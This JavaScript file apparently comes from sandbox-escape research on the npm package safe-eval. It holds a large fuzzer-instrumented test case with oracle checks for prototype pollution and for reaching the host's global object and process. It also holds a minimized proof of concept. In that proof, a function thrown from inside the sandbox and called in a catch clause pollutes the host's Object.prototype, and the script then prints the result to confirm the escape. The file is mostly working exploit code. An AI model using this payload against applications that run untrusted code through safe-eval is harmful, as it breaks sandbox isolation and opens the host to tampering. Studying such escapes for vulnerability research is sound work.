let code = `
let global = this;
let Test262Error = Error;
function isGetter(obj, prop) {
    return !!Object.getOwnPropertyDescriptor(obj, prop)['get'];
}
function isSetter(obj, prop) {
    return !!Object.getOwnPropertyDescriptor(obj, prop)['set'];
}
function getAllProperties(obj) {
    let allProps = [], curr = obj;
    try {
        do {
            let props = Object.getOwnPropertyNames(curr);
            props.forEach(function (prop) {
                if (allProps.indexOf(prop) === -1)
                    allProps.push(prop);
            });
        } while (curr = curr.__proto__);
    } catch (e) {
    }
    return allProps;
}
function getAllReferences(obj) {
    let visited = new WeakMap();
    if (!obj || typeof obj !== 'object' && typeof obj !== 'function')
        return [];
    visited.set(obj, true);
    function getRefsRecursive(obj, path) {
        let res = [];
        if (!obj)
            return res;
        if (typeof obj !== 'object' && typeof obj !== 'function')
            return res;
        let keys = getAllProperties(obj);
        for (let i = 0; i < keys.length; i++) {
            try {
                if (isGetter(obj, keys[i]) || isSetter(obj, keys[i]))
                    continue;
                let val = obj[keys[i]];
                if (val && !visited.has(val) && (typeof val === 'object' || typeof val === 'function')) {
                    let currPath = path + '.' + keys[i];
                    visited.set(val, true);
                    res.push({
                        path: currPath,
                        val: val
                    });
                    res = res.concat(getRefsRecursive(val, currPath));
                }
            } catch (e) {
                res.push(e);
            }
        }
        return res;
    }
    return getRefsRecursive(obj, 'ref');
}
function getRootConstructor(obj) {
    if (typeof obj !== 'object' && typeof obj !== 'function' || !obj.constructor) {
        return Object.constructor;
    }
    while (obj.constructor) {
        if (obj === obj.constructor) {
            break;
        }
        obj = obj.constructor;
    }
    return obj;
}
function getRootPrototype(obj) {
    stats.oracleChecks++;
    try {
        if (!obj)
            return Object.prototype;
        if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
            return Object.prototype;
        }
        while (obj.__proto__) {
            obj = obj.__proto__;
        }
        return obj;
    } catch (e) {
        return Object.prototype;
    }
}
function checkBreakout(x, path) {
    stats.oracleChecks++;
    try {
        if (x === 'SandDriller-23420409')
            leak('SB-SUCCESS: The property ' + path + ' is able to read outside the sandbox');
        let dis = getRootConstructor(x)('return this;')();
        if (dis.flag === 'SandDriller-23420409')
            leak('SB-SUCCESS: The property ' + path + ' is able to read outside the sandbox');
        if (dis.process && dis.process.mainModule) {
            leak('SB-SUCCESS: The property ' + path + ' is able to call outside the sandbox');
        }
    } catch (DONOTINSTRUMENT) {
    }
}
function checkReferenceRecursive(ref, cb) {
    let stack = new Error().stack;
    var count = (stack.match(/checkReferenceRecursive/g) || []).length;
    if (count > 1) {
        return;
    }
    let rootPrototype = getRootPrototype(ref);
    if (rootPrototype !== Object.prototype) {
        cb(rootPrototype, 'ref');
    }
    checkBreakout(ref, 'ref');
    let refs = getAllReferences(ref);
    for (let i = 0; i < refs.length; i++) {
        let rootPrototype = getRootPrototype(refs[i].val);
        if (rootPrototype !== Object.prototype) {
            cb(rootPrototype, refs[i].path);
        }
        checkBreakout(refs[i].val, refs[i].path);
    }
}
try {
    var stack;
    var used_custom_lookup = false;
    global.temp0 = {
        __lookupGetter__: function () {
            if (typeof arguments !== 'undefined' && arguments.length > 0) {
                checkReferenceRecursive(arguments, (root, path) => {
                    try {
                        root.FEA = 'FE: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FEA-SUCCESS: The property ' + path + ' of arguments of function anonymous24 has a different root prototype [line 5]');
                });
            }
            let grtT = getRootPrototype(this);
            checkBreakout(this);
            if (grtT !== Object.__proto__) {
                try {
                    grtT.FET = 'FE: Got it?';
                    Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
                } catch (e) {
                }
                leak('FET-SUCCESS: "this" object of function anonymous24 has a different root prototype [line 5]');
            }
            if (this)
                checkReferenceRecursive(this, (root, path) => {
                    try {
                        root.FET = 'FE: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FET-SUCCESS: The property ' + path + ' of this in function anonymous24 has a different root prototype [line 5]');
                });
            used_custom_lookup = true;
        },
        test: function () {
            if (typeof arguments !== 'undefined' && arguments.length > 0) {
                checkReferenceRecursive(arguments, (root, path) => {
                    try {
                        root.FEA = 'FE: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FEA-SUCCESS: The property ' + path + ' of arguments of function anonymous27 has a different root prototype [line 8]');
                });
            }
            let grtT = getRootPrototype(this);
            checkBreakout(this);
            if (grtT !== Object.__proto__) {
                try {
                    grtT.FET = 'FE: Got it?';
                    Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
                } catch (e) {
                }
                leak('FET-SUCCESS: "this" object of function anonymous27 has a different root prototype [line 8]');
            }
            if (this)
                checkReferenceRecursive(this, (root, path) => {
                    try {
                        root.FET = 'FE: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FET-SUCCESS: The property ' + path + ' of this in function anonymous27 has a different root prototype [line 8]');
                });
            throw function thrower() {
                if (typeof arguments !== 'undefined' && arguments.length > 0) {
                    checkReferenceRecursive(arguments, (root, path) => {
                        try {
                            root.FEA = 'FE: Got it?';
                            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                        } catch (e) {
                        }
                        leak('FEA-SUCCESS: The property ' + path + ' of arguments of function thrower has a different root prototype [line 9]');
                    });
                }
                let grtT = getRootPrototype(this);
                checkBreakout(this);
                if (grtT !== Object.__proto__) {
                    try {
                        grtT.FET = 'FE: Got it?';
                        Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FET-SUCCESS: "this" object of function thrower has a different root prototype [line 9]');
                }
                if (this)
                    checkReferenceRecursive(this, (root, path) => {
                        try {
                            root.FET = 'FE: Got it?';
                            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                        } catch (e) {
                        }
                        leak('FET-SUCCESS: The property ' + path + ' of this in function thrower has a different root prototype [line 9]');
                    });
                return () => {
                    if (typeof arguments !== 'undefined' && arguments.length > 0) {
                        checkReferenceRecursive(arguments, (root, path) => {
                            try {
                                root.FEA = 'FE: Got it?';
                                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                            } catch (e) {
                            }
                            leak('FEA-SUCCESS: The property ' + path + ' of arguments of function anonymous32 has a different root prototype [line 10]');
                        });
                    }
                    let grtT = getRootPrototype(this);
                    checkBreakout(this);
                    if (grtT !== Object.__proto__) {
                        try {
                            grtT.FET = 'FE: Got it?';
                            Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
                        } catch (e) {
                        }
                        leak('FET-SUCCESS: "this" object of function anonymous32 has a different root prototype [line 10]');
                    }
                    if (this)
                        checkReferenceRecursive(this, (root, path) => {
                            try {
                                root.FET = 'FE: Got it?';
                                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                            } catch (e) {
                            }
                            leak('FET-SUCCESS: The property ' + path + ' of this in function anonymous32 has a different root prototype [line 10]');
                        });
                    return this;
                };
            };
            try {
                global.temp1 = f(), function functionInvocationAnalysis(r) {
                    let grtA = getRootPrototype(r);
                    if (grtA !== Object.__proto__) {
                        try {
                            grtA.FIA = 'FI: Got it?';
                            Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
                        } catch (e) {
                        }
                        leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 15]');
                    }
                    checkReferenceRecursive(r, (root, path) => {
                        try {
                            root.FIA = 'FI: Got it?';
                            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                        } catch (e) {
                        }
                        leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 15]');
                    });
                }(temp1), global.temp1;
            } catch (err) {
                checkBreakout(err);
                if (getRootPrototype(err) !== Object.__proto__) {
                    try {
                        getRootPrototype(err).CCA = 'CC: Got it?';
                        Object.defineProperty(getRootPrototype(err), 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('CCA-SUCCESS: The parameter err of the catch clause has a different root prototype [line 16]');
                }
                checkReferenceRecursive(err, (root, path) => {
                    try {
                        root.CCA = 'CC: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('CCA-SUCCESS: The property ' + path + ' of parameter err of the catch clause has a different root prototype [line 16]');
                });
                stack = err.stack;
            }
        }
    }.test(), function functionInvocationAnalysis(r) {
        let grtA = getRootPrototype(r);
        if (grtA !== Object.__proto__) {
            try {
                grtA.FIA = 'FI: Got it?';
                Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 4]');
        }
        checkReferenceRecursive(r, (root, path) => {
            try {
                root.FIA = 'FI: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 4]');
        });
    }(temp0), global.temp0;
    var expected_message = 'ReferenceError: f is not defined';
    global.temp2 = assertTrue((global.temp3 = stack.indexOf(expected_message), function functionInvocationAnalysis(r) {
        let grtA = getRootPrototype(r);
        if (grtA !== Object.__proto__) {
            try {
                grtA.FIA = 'FI: Got it?';
                Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 22]');
        }
        checkReferenceRecursive(r, (root, path) => {
            try {
                root.FIA = 'FI: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 22]');
        });
    }(temp3), global.temp3) >= 0), function functionInvocationAnalysis(r) {
        let grtA = getRootPrototype(r);
        if (grtA !== Object.__proto__) {
            try {
                grtA.FIA = 'FI: Got it?';
                Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 22]');
        }
        checkReferenceRecursive(r, (root, path) => {
            try {
                root.FIA = 'FI: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 22]');
        });
    }(temp2), global.temp2;
    global.temp4 = assertFalse(used_custom_lookup), function functionInvocationAnalysis(r) {
        let grtA = getRootPrototype(r);
        if (grtA !== Object.__proto__) {
            try {
                grtA.FIA = 'FI: Got it?';
                Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 23]');
        }
        checkReferenceRecursive(r, (root, path) => {
            try {
                root.FIA = 'FI: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 23]');
        });
    }(temp4), global.temp4;
} catch (e) {
    checkBreakout(e);
    if (getRootPrototype(e) !== Object.__proto__) {
        try {
            getRootPrototype(e).CCA = 'CC: Got it?';
            Object.defineProperty(getRootPrototype(e), 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype [line 24]');
    }
    checkReferenceRecursive(e, (root, path) => {
        try {
            root.CCA = 'CC: Got it?';
            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('CCA-SUCCESS: The property ' + path + ' of parameter e of the catch clause has a different root prototype [line 24]');
    });
    try {
        global.temp5 = e(function catchFct() {
            if (typeof arguments !== 'undefined' && arguments.length > 0) {
                checkReferenceRecursive(arguments, (root, path) => {
                    try {
                        root.FEA = 'FE: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FEA-SUCCESS: The property ' + path + ' of arguments of function catchFct has a different root prototype [line 26]');
                });
            }
            let grtT = getRootPrototype(this);
            checkBreakout(this);
            if (grtT !== Object.__proto__) {
                try {
                    grtT.FET = 'FE: Got it?';
                    Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
                } catch (e) {
                }
                leak('FET-SUCCESS: "this" object of function catchFct has a different root prototype [line 26]');
            }
            if (this)
                checkReferenceRecursive(this, (root, path) => {
                    try {
                        root.FET = 'FE: Got it?';
                        Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                    } catch (e) {
                    }
                    leak('FET-SUCCESS: The property ' + path + ' of this in function catchFct has a different root prototype [line 26]');
                });
        }), function functionInvocationAnalysis(r) {
            let grtA = getRootPrototype(r);
            if (grtA !== Object.__proto__) {
                try {
                    grtA.FIA = 'FI: Got it?';
                    Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
                } catch (e) {
                }
                leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 26]');
            }
            checkReferenceRecursive(r, (root, path) => {
                try {
                    root.FIA = 'FI: Got it?';
                    Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
                } catch (e) {
                }
                leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 26]');
            });
        }(temp5), global.temp5;
    } catch (e) {
        checkBreakout(e);
        if (getRootPrototype(e) !== Object.__proto__) {
            try {
                getRootPrototype(e).CCA = 'CC: Got it?';
                Object.defineProperty(getRootPrototype(e), 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype [line 28]');
        }
        checkReferenceRecursive(e, (root, path) => {
            try {
                root.CCA = 'CC: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('CCA-SUCCESS: The property ' + path + ' of parameter e of the catch clause has a different root prototype [line 28]');
        });
    }
}
`; 



let Minimizedcode = `
try {
    ({
        test: function () {
            throw function thrower() {
                this.__proto__.polluted = "polluted: Got it?";
            };
        }
    }).test()

} catch (e) {
    e()
}
`;


let leak = console.log;
let stats = {oracleChecks: 0}
let endows = {leak:leak, stats:stats}
let safeEval = require("safe-eval");


//safeEval("1;" + code, endows);
safeEval("1;" + Minimizedcode, endows);
//console.log(Object.prototype.p, {}.polluted, Object.prototype.FEA, Object.prototype.FET, Object.prototype.FIA, Object.prototype.FIT, Object.prototype.CCA, Object.prototype.CCT);
console.log({}.polluted);